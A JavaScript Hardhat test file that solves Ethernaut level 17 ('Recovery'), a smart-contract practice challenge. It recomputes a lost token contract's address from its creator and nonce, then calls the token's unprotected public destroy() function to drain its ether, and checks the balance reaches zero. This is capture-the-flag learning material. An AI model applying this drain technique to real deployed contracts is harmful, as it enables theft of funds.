const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Seventeen", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const EthernautSeventeenRecovery = await ethers.getContractFactory(
      "EthernautSeventeenRecovery"
    );
    const ethernautSeventeenRecovery =
      await EthernautSeventeenRecovery.deploy();
    await ethernautSeventeenRecovery.deployed();

    const name = "VulnerableToken";
    const initialSupply = 100_000;
    await ethernautSeventeenRecovery.generateToken(name, initialSupply);

    const vulnerableTokenAddress = ethers.utils.getContractAddress({
      from: ethernautSeventeenRecovery.address,
      nonce: 1,
    });
    await deployer.sendTransaction({
      to: vulnerableTokenAddress,
      value: ethers.utils.parseEther("0.001"),
    });

    return { deployer, ethernautSeventeenRecovery, name, initialSupply };
  }

  describe("Exploit", function () {
    it("Drained all the ether from the deployed token", async function () {
      const { deployer, ethernautSeventeenRecovery } = await loadFixture(
        deployToken
      );

      // TODO: better to calculate the logic the logic of this function yourself as a learning exercise
      const vulnerableTokenAddress = ethers.utils.getContractAddress({
        from: ethernautSeventeenRecovery.address,
        nonce: 1,
      });

      const EthernautSeventeenSimpleToken = await ethers.getContractFactory(
        "EthernautSeventeenSimpleToken"
      );
      const ethernautSeventeenSimpleToken =
        EthernautSeventeenSimpleToken.attach(vulnerableTokenAddress);

      expect(
        await ethernautSeventeenRecovery.provider.getBalance(
          vulnerableTokenAddress
        )
      ).to.equal(ethers.utils.parseEther("0.001"));
      await ethernautSeventeenSimpleToken
        .connect(deployer)
        .destroy(deployer.address);
      expect(
        await ethernautSeventeenRecovery.provider.getBalance(
          vulnerableTokenAddress
        )
      ).to.equal(0);
    });
  });
});
